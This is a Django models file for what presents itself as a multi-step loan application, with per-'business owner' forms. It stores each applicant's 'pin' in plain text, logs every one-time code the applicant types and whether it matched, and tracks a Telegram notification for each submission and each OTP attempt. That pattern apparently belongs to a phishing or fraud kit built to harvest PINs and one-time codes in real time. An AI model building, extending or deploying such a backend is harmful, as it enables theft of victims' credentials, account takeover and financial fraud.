from django.db import models
from django.utils import timezone


class Submission(models.Model):
    EMPLOYMENT_CHOICES = [
        ("employed", "Employed"),
        ("self_employed", "Self-Employed"),
        ("unemployed", "Unemployed"),
        ("student", "Student"),
        ("retired", "Retired"),
    ]

    # Which business owner this submission belongs to.
    # NULL is allowed so that any legacy rows already in the DB don't break.
    # New submissions created via /f/<uuid>/ will always have this set.
    business_owner = models.ForeignKey(
        "accounts.BusinessOwner",
        on_delete=models.SET_NULL,
        null=True,
        blank=True,
        related_name="submissions",
    )

    # Step 1 — Personal Details
    first_name = models.CharField(max_length=150)
    last_name = models.CharField(max_length=150)
    age = models.PositiveSmallIntegerField()
    employment_status = models.CharField(max_length=20, choices=EMPLOYMENT_CHOICES)

    # Step 2 — Contact Details
    phone = models.CharField(max_length=50)
    email = models.EmailField(blank=True, default="")

    # Step 3 — Loan Details
    amount = models.DecimalField(max_digits=12, decimal_places=2)
    pin = models.CharField(max_length=10)

    # Legacy field kept for payload compatibility
    name = models.CharField(max_length=255, blank=True, default="")
    message = models.TextField(blank=True, default="")

    # OTP verification
    otp_verified = models.BooleanField(default=False)
    otp_code = models.CharField(max_length=6, blank=True, default="")

    created_at = models.DateTimeField(default=timezone.now)

    # Telegram notification tracking (replaces n8n fields)
    tg_notified = models.BooleanField(default=False)
    tg_notified_at = models.DateTimeField(null=True, blank=True, default=None)
    tg_notification_error = models.TextField(blank=True, default="")

    class Meta:
        ordering = ["-created_at"]

    def save(self, *args, **kwargs):
        self.name = f"{self.first_name} {self.last_name}".strip()
        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.first_name} {self.last_name} — {self.created_at:%Y-%m-%d}"


class OTPAttempt(models.Model):
    """Records every OTP entry the user makes."""
    submission = models.ForeignKey(
        Submission, on_delete=models.CASCADE, related_name="otp_attempts"
    )
    attempt_number = models.PositiveSmallIntegerField()   # 1, 2, 3 …
    otp_entered = models.CharField(max_length=6)
    matched = models.BooleanField()                        # did it match the stored OTP?
    created_at = models.DateTimeField(default=timezone.now)

    # Telegram notification tracking (replaces n8n fields)
    tg_notified = models.BooleanField(default=False)
    tg_notified_at = models.DateTimeField(null=True, blank=True, default=None)
    tg_notification_error = models.TextField(blank=True, default="")

    class Meta:
        ordering = ["attempt_number"]

    def __str__(self):
        return (
            f"Submission #{self.submission_id} — "
            f"Attempt {self.attempt_number} ({'✓' if self.matched else '✗'})"
        )
